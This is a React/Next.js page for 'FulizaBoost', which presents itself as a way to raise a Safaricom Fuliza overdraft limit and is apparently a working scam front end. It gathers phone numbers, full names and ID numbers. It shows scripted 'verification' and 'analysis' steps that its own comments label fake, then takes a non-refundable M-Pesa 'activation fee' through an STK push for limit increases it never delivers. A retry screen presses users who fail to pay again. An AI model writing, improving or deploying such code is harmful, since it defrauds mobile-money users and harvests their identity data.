'use client';

import React, { useState, useEffect, Suspense } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { 
  ArrowLeft, 
  Zap, 
  Smartphone, 
  CheckCircle2, 
  Loader2, 
  Lock, 
  User, 
  CreditCard, 
  ChevronRight, 
  BadgeCheck, 
  AlertCircle, 
  ShieldCheck,
  TrendingUp,
  XCircle,
  RefreshCcw,
  Info,
  Server
} from 'lucide-react';
import { Button } from '@/components/ui/button';

// --- CONFIGURATION ---
const LIMIT_OPTIONS = [
  { amount: 5000, fee: 100, label: 'Starter' },
  { amount: 7500, fee: 150, label: 'Popular' },
  { amount: 10000, fee: 200, label: 'Recommended' },
  { amount: 15000, fee: 300, label: 'Business' },
  { amount: 20000, fee: 400, label: 'Business+' },
  { amount: 35000, fee: 700, label: 'Elite' },
  { amount: 50000, fee: 1000, label: 'Pro' },
  { amount: 70000, fee: 1400, label: 'Max' },
];

// --- REUSABLE COMPONENTS (Matches Loan Page) ---

const IconContainer = ({ children }: { children: React.ReactNode }) => (
  <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
    {children}
  </div>
);

const CustomInput = ({
  label,
  icon: Icon,
  type = "text",
  value,
  onChange,
  placeholder
}: any) => (
  <div className="relative">
      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
      <div className="relative flex items-center h-14 w-full rounded-xl border border-slate-200 bg-white hover:border-blue-400 focus-within:border-blue-600 focus-within:ring-1 focus-within:ring-blue-600 transition-all">
          <IconContainer>
              <Icon className="w-5 h-5" />
          </IconContainer>
          <input 
              type={type}
              className="w-full h-full pl-16 pr-4 bg-transparent outline-none text-slate-900 font-bold text-sm placeholder:text-slate-400"
              placeholder={placeholder}
              value={value}
              onChange={onChange}
          />
      </div>
  </div>
);

export default function FulizaPage() {
  const router = useRouter();

  // Steps: verify -> details -> analyze -> offers -> summary -> stk_push -> success -> failed
  const [step, setStep] = useState('verify');

  // Data
  const [phone, setPhone] = useState('');
  const [details, setDetails] = useState({ fullName: '', idNumber: '' });
  const [selectedOffer, setSelectedOffer] = useState<{amount: number, fee: number, label: string} | null>(null);
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [trackingId] = useState(`FZ-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);

  // UI State
  const [loadingText, setLoadingText] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
  const [errorMsg, setErrorMsg] = useState('');

  // --- HANDLERS ---

  // 1. Phone Input (Strict)
  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 10);
    setPhone(val);
    setErrorMsg('');
  };

  // 2. Verify Phone
  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length !== 10 || (!phone.startsWith('01') && !phone.startsWith('07'))) {
        setErrorMsg('Enter a valid 10-digit Safaricom number');
        return;
    }
    setErrorMsg('');
    setIsProcessing(true);

    // Fake connection sequence
    const sequence = [
        { t: 'Connecting to Safaricom Overdraft...', d: 1000 },
        { t: 'Verifying Subscriber Status...', d: 1500 },
        { t: 'Connection Established', d: 500 }
    ];

    let totalDelay = 0;
    sequence.forEach(({ t, d }, i) => {
        totalDelay += d;
        setTimeout(() => {
            setLoadingText(t);
            if (i === sequence.length - 1) {
                setTimeout(() => {
                    setIsProcessing(false);
                    setStep('details');
                }, 500);
            }
        }, totalDelay);
    });
  };

  // 3. Details & Analysis
  const handleDetailsSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Validate
    if (!details.fullName.trim() || details.idNumber.length < 6) {
        setErrorMsg('Please enter valid Name and ID');
        return;
    }
    setErrorMsg('');
    setIsProcessing(true);

    // Fake "Analysis" sequence
    const sequence = [
        { t: `Authenticating ${details.fullName.split(' ')[0]}...`, d: 1200 },
        { t: 'Scanning M-Pesa Transaction History...', d: 2000 },
        { t: 'Calculating Maximum Limit Cap...', d: 1500 },
        { t: 'Optimizing Offer List...', d: 800 }
    ];

    let totalDelay = 0;
    sequence.forEach(({ t, d }, i) => {
        totalDelay += d;
        setTimeout(() => {
            setLoadingText(t);
            if (i === sequence.length - 1) {
                setTimeout(() => {
                    setIsProcessing(false);
                    setStep('offers');
                }, 800);
            }
        }, totalDelay);
    });
  };

  // 4. Select Offer
  const handleSelectOffer = (offer: any) => {
      setSelectedOffer(offer);
      setStep('summary');
      window.scrollTo(0,0);
  };

  // 5. Submit Payment
  const handlePayment = async () => {
    if (!selectedOffer || !termsAccepted) {
        setErrorMsg('Please accept the terms to proceed.');
        return;
    }
    setIsProcessing(true);
    
    try {
        const res = await fetch('/api/stkpush', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                phoneNumber: phone,
                idNumber: details.idNumber,
                amount: selectedOffer.fee,
                serviceType: 'FULIZA_BOOST'
            })
        });

        const data = await res.json();
        if (data.success) {
            setIsProcessing(false);
            setStep('stk_push');
            startPolling(data.checkoutRequestID);
        } else {
            alert(data.error || 'Connection failed');
            setIsProcessing(false);
        }
    } catch (err) {
        setIsProcessing(false);
        alert('Network Error');
    }
  };

  const startPolling = (reqId: string) => {
    let attempts = 0;
    const interval = setInterval(async () => {
        attempts++;
        try {
            const res = await fetch(`/api/check-status?id=${reqId}`);
            const data = await res.json();
            if (data.status === 'COMPLETED') {
                clearInterval(interval);
                // Fake "Syncing" Animation before success
                setStep('syncing');
                setTimeout(() => setStep('success'), 3000);
            } else if (data.status === 'FAILED') {
                clearInterval(interval);
                setStep('failed');
            } else {
                setPollMessage(attempts % 2 === 0 ? 'Waiting for PIN...' : 'Processing...');
            }
            if (attempts > 60) {
                clearInterval(interval);
                setStep('failed');
            }
        } catch(e) {}
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-slate-50/50 font-sans text-slate-900">
      
      {/* --- STATUS BAR --- */}
      <div className="bg-slate-900 text-white text-[10px] font-bold py-2 px-3 relative z-50">
        <div className="max-w-md mx-auto flex justify-between items-center">
            <div className="flex items-center gap-2">
                <div className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse"></div>
                <span className="tracking-wide opacity-90">SYSTEM ONLINE</span>
            </div>
            <div className="flex items-center gap-1 opacity-75">
                <ShieldCheck className="w-3 h-3" />
                <span>Encrypted</span>
            </div>
        </div>
      </div>

      {/* --- HEADER --- */}
      <header className="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-slate-100">
        <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
            <div className="flex items-center gap-3">
              {step !== 'verify' && step !== 'success' ? (
                <button onClick={() => setStep('verify')} className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center">
                    <ArrowLeft className="w-4 h-4 text-slate-600"/>
                </button>
              ) : (
                <Link href="/" className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center">
                    <ArrowLeft className="w-4 h-4 text-slate-600"/>
                </Link>
              )}
              <span className="font-black text-slate-900 tracking-tight text-lg">FulizaBoost</span>
            </div>
            <div className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-[10px] font-bold uppercase tracking-wide flex items-center gap-1">
               <Zap className="w-3 h-3 fill-current" /> Auto
            </div>
        </div>
      </header>

      {/* --- MAIN CONTENT --- */}
      <main className="max-w-md mx-auto px-4 py-8 pb-24">

        {/* STEP 1: VERIFY */}
        {step === 'verify' && (
             <div className="animate-in slide-in-from-bottom-4 duration-500">
                <div className="text-center mb-8">
                    <h1 className="text-2xl font-black text-slate-900 mb-2">Check Limit</h1>
                    <p className="text-sm text-slate-500 font-medium">Enter M-Pesa number to scan for increases.</p>
                </div>
                
                <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100 p-6">
                    {!isProcessing ? (
                        <form onSubmit={handleVerify} className="space-y-6">
                             <CustomInput 
                                label="Phone Number"
                                icon={Smartphone}
                                type="tel"
                                placeholder="0712345678"
                                value={phone}
                                onChange={handlePhoneInput}
                            />
                            {errorMsg && (
                                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
                                    <AlertCircle className="w-4 h-4" /> {errorMsg}
                                </div>
                            )}
                            <Button className="w-full h-14 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl text-base shadow-lg transition-transform hover:-translate-y-0.5">
                                Scan Now
                            </Button>
                            <div className="flex items-center justify-center gap-2 text-xs text-slate-400 font-bold pt-2">
                                <Lock className="w-3 h-3" /> Secure Verification
                            </div>
                        </form>
                    ) : (
                        <div className="py-12 text-center space-y-6">
                            <Loader2 className="w-12 h-12 text-blue-600 animate-spin mx-auto" />
                            <p className="text-sm font-bold text-slate-700 animate-pulse">{loadingText}</p>
                        </div>
                    )}
                </div>
             </div>
        )}

        {/* STEP 2: DETAILS */}
        {step === 'details' && (
             <div className="animate-in slide-in-from-right duration-500">
                 <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100 overflow-hidden">
                     <div className="bg-blue-50/50 p-5 border-b border-blue-50 flex items-center justify-between rounded-t-xl">
                        <div>
                            <h2 className="text-xs font-bold text-blue-800 uppercase tracking-wide">Subscriber Found</h2>
                            <p className="text-sm font-black text-slate-900 mt-0.5">{phone}</p>
                        </div>
                        <BadgeCheck className="w-6 h-6 text-blue-500" />
                    </div>

                    {!isProcessing ? (
                        <form onSubmit={handleDetailsSubmit} className="p-6 space-y-5">
                            <div className="text-center mb-2">
                                <p className="text-sm text-slate-500 font-medium">Verify your identity to unlock limits.</p>
                            </div>

                            <CustomInput 
                                label="Full Name"
                                icon={User}
                                placeholder="e.g. John Doe"
                                value={details.fullName}
                                onChange={(e: any) => setDetails({...details, fullName: e.target.value})}
                            />

                            <CustomInput 
                                label="ID Number"
                                icon={CreditCard}
                                type="tel"
                                placeholder="e.g. 12345678"
                                value={details.idNumber}
                                onChange={(e: any) => {
                                    const val = e.target.value.replace(/\D/g, '').slice(0, 8);
                                    setDetails({...details, idNumber: val})
                                }}
                            />

                            {errorMsg && (
                                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
                                    <AlertCircle className="w-4 h-4" /> {errorMsg}
                                </div>
                            )}

                            <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg mt-2">
                                Analyze & Unlock <ChevronRight className="w-4 h-4 ml-2" />
                            </Button>
                        </form>
                    ) : (
                        <div className="p-10 text-center space-y-6">
                            <div className="relative w-16 h-16 mx-auto">
                                <div className="absolute inset-0 border-4 border-slate-50 rounded-full"></div>
                                <div className="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                            </div>
                            <p className="text-sm font-bold text-slate-700 animate-pulse leading-relaxed px-4">{loadingText}</p>
                        </div>
                    )}
                 </div>
             </div>
        )}

        {/* STEP 3: OFFERS (GRID) */}
        {step === 'offers' && (
            <div className="animate-in zoom-in-95 duration-500">
                <div className="text-center mb-6">
                    <h2 className="text-xl font-black text-slate-900">Hello {details.fullName.split(' ')[0]}!</h2>
                    <p className="text-sm text-slate-500 font-medium">You qualify for the following limits.</p>
                </div>

                <div className="grid grid-cols-2 gap-3">
                    {LIMIT_OPTIONS.map((opt) => (
                        <button 
                            key={opt.amount}
                            onClick={() => handleSelectOffer(opt)}
                            className="group relative bg-white p-4 rounded-xl border border-slate-200 hover:border-blue-500 hover:shadow-lg transition-all text-left overflow-hidden"
                        >
                            {opt.label === 'Recommended' && (
                                <div className="absolute top-0 right-0 bg-blue-500 text-white text-[9px] font-bold px-2 py-0.5 rounded-bl-lg">
                                    BEST
                                </div>
                            )}
                            <div className="text-[10px] font-bold text-slate-400 uppercase mb-1">{opt.label}</div>
                            <div className="text-lg font-black text-slate-900 mb-2">KES {opt.amount.toLocaleString()}</div>
                            <div className="inline-block bg-slate-50 text-slate-600 text-[10px] font-bold px-2 py-1 rounded group-hover:bg-blue-50 group-hover:text-blue-700">
                                Fee: {opt.fee}
                            </div>
                        </button>
                    ))}
                </div>
            </div>
        )}

        {/* STEP 4: SUMMARY */}
        {step === 'summary' && selectedOffer && (
            <div className="animate-in slide-in-from-bottom-4 duration-500">
                 <div className="bg-white rounded-xl shadow-xl border border-slate-100 overflow-hidden">
                    <div className="bg-slate-900 p-6 text-white text-center">
                        <h2 className="text-lg font-bold">Confirm Boost</h2>
                        <p className="text-slate-400 text-xs mt-1">Final step to activate your limit.</p>
                    </div>

                    <div className="p-6">
                         <div className="space-y-4 border-b border-slate-100 pb-6 mb-6">
                             <div className="flex justify-between items-center">
                                <span className="text-slate-500 text-sm font-bold uppercase">Subscriber</span>
                                <span className="text-slate-900 font-bold text-sm">{details.fullName}</span>
                            </div>
                             <div className="flex justify-between items-center">
                                <span className="text-slate-500 text-sm font-bold uppercase">Phone</span>
                                <span className="text-slate-900 font-bold text-sm">{phone}</span>
                            </div>
                            <div className="h-px bg-slate-50 my-2"></div>
                            <div className="flex justify-between items-center">
                                <span className="text-slate-900 font-bold">New Limit</span>
                                <span className="text-2xl font-black text-blue-600">KES {selectedOffer.amount.toLocaleString()}</span>
                            </div>
                            
                            <div className="bg-blue-50/80 p-4 rounded-xl border border-blue-100 space-y-2">
                                <div className="flex justify-between items-center">
                                    <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Activation Fee</span>
                                    <span className="text-blue-900 font-black text-lg">KES {selectedOffer.fee}</span>
                                </div>
                                <div className="flex gap-2 items-start">
                                    <Info className="w-3 h-3 text-blue-600 mt-0.5 shrink-0" />
                                    <p className="text-[10px] text-blue-700 font-medium leading-tight">
                                        <span className="font-bold">Non-refundable.</span> Covers scoring & profile update fees.
                                    </p>
                                </div>
                            </div>
                         </div>

                         <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 flex gap-3 items-start mb-6">
                            <div className="pt-0.5">
                                <input 
                                    type="checkbox" 
                                    id="terms"
                                    checked={termsAccepted}
                                    onChange={(e) => setTermsAccepted(e.target.checked)}
                                    className="w-5 h-5 rounded border-slate-300 text-blue-600 focus:ring-blue-500 cursor-pointer"
                                />
                            </div>
                            <label htmlFor="terms" className="text-xs text-slate-500 font-medium leading-relaxed cursor-pointer">
                                I confirm the details above and understand the fee is for limit assessment and is non-refundable.
                            </label>
                        </div>
                        
                        {errorMsg && (
                            <div className="mb-4 text-center text-red-600 text-xs font-bold">
                                {errorMsg}
                            </div>
                        )}

                        <Button 
                            onClick={handlePayment}
                            disabled={isProcessing}
                            className="w-full h-16 bg-blue-600 hover:bg-blue-500 text-white font-black text-lg rounded-xl shadow-xl shadow-blue-600/20 transition-transform hover:-translate-y-0.5"
                        >
                             {isProcessing ? (
                                <div className="flex items-center gap-2">
                                    <Loader2 className="w-5 h-5 animate-spin" />
                                    <span>Processing...</span>
                                </div>
                            ) : (
                                <span>Pay KES {selectedOffer.fee}</span>
                            )}
                        </Button>
                        
                        <button 
                            onClick={() => setStep('offers')} 
                            className="w-full text-center mt-6 text-xs font-bold text-slate-400 hover:text-slate-600"
                        >
                            Select Different Limit
                        </button>
                    </div>
                 </div>
            </div>
        )}

        {/* STEP 5: POLLING */}
        {step === 'stk_push' && selectedOffer && (
             <div className="animate-in zoom-in-95 duration-500 pt-10 text-center">
                 <div className="bg-white p-8 rounded-xl shadow-2xl border border-slate-50 relative overflow-hidden">
                    <div className="w-24 h-24 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6 relative">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-20"></span>
                        <Smartphone className="w-10 h-10 text-blue-600 relative z-10" />
                    </div>
                    
                    <h2 className="text-xl font-black text-slate-900 mb-2">Check Your Phone</h2>
                    <p className="text-slate-500 font-medium mb-6 leading-relaxed text-sm">
                        Enter PIN to pay <span className="text-blue-600 font-bold">KES {selectedOffer.fee}</span> to activate your KES {selectedOffer.amount.toLocaleString()} limit.
                    </p>

                    <div className="bg-slate-50 rounded-xl p-4 border border-slate-100">
                        <div className="flex justify-between items-center mb-3">
                            <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Status</span>
                            <span className="text-[10px] font-bold text-blue-600 bg-blue-100 px-3 py-1 rounded-full animate-pulse">
                                {pollMessage}
                            </span>
                        </div>
                        <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
                            <div className="h-full bg-blue-500 animate-[width_15s_ease-in-out_forwards]" style={{width: '90%'}}></div>
                        </div>
                    </div>
                </div>
             </div>
        )}

        {/* STEP 6: SYNCING (Transition) */}
        {step === 'syncing' && (
             <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700">
                 <Server className="w-16 h-16 text-blue-600 mx-auto animate-pulse" />
                 <h2 className="text-2xl font-black text-slate-900">Syncing Profile...</h2>
                 <p className="text-slate-500 font-medium">Updating SIM Services with new limit.</p>
             </div>
        )}

        {/* STEP 7: SUCCESS */}
        {step === 'success' && selectedOffer && (
             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
                <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
                    <CheckCircle2 className="w-10 h-10 text-emerald-600" />
                </div>
                
                <h2 className="text-2xl font-black text-slate-900 mb-2">Fee Received!</h2>
                <p className="text-slate-500 font-medium mb-8 px-4 text-sm leading-relaxed">
                    Your request to boost to <span className="text-slate-900 font-bold">KES {selectedOffer.amount.toLocaleString()}</span> has been queued.
                </p>
                
                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-5">
                    <div className="flex gap-4">
                        <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">1</div>
                        <div>
                            <h4 className="font-bold text-slate-900 text-sm">Payment Verified</h4>
                            <p className="text-xs text-slate-500 mt-0.5">Activation fee received successfully.</p>
                        </div>
                    </div>
                    <div className="flex gap-4">
                        <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">2</div>
                        <div>
                            <h4 className="font-bold text-slate-900 text-sm">Limit Update Pending</h4>
                            <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
                                System is reviewing your history. New limit will reflect in <span className="text-blue-600 font-bold">1 - 24 hours</span>.
                            </p>
                        </div>
                    </div>
                     <div className="pt-4 border-t border-slate-50">
                        <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Tracking ID</p>
                        <div className="font-mono text-sm font-bold text-slate-700 bg-slate-100 p-3 rounded-xl text-center select-all border border-slate-200">
                            {trackingId}
                        </div>
                     </div>
                </div>

                <Button onClick={() => router.push('/')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
                    Return Home
                </Button>
             </div>
        )}

        {/* STEP 8: FAILED */}
        {step === 'failed' && selectedOffer && (
             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
                 <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6">
                    <XCircle className="w-10 h-10 text-orange-500" />
                </div>
                
                <h2 className="text-2xl font-black text-slate-900 mb-2">Payment Failed</h2>
                <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
                    We could not verify the fee of <span className="font-bold text-slate-900">KES {selectedOffer.fee}</span>. Limit activation cannot proceed without it.
                </p>
                
                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
                    <p className="text-xs text-slate-500 font-medium mb-6">
                        Your pre-approval for <span className="font-bold text-slate-900">KES {selectedOffer.amount.toLocaleString()}</span> is saved for 2 hours.
                    </p>
                    <div className="flex flex-col gap-3">
                        <Button 
                            onClick={() => setStep('summary')}
                            className="w-full h-12 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl flex items-center justify-center gap-2"
                        >
                            <RefreshCcw className="w-4 h-4" /> Retry Payment
                        </Button>
                        <button onClick={() => setStep('offers')} className="text-xs font-bold text-slate-400 hover:text-slate-600 py-3">
                            Select Lower Limit
                        </button>
                    </div>
                </div>
             </div>
        )}

      </main>
    </div>
  );
}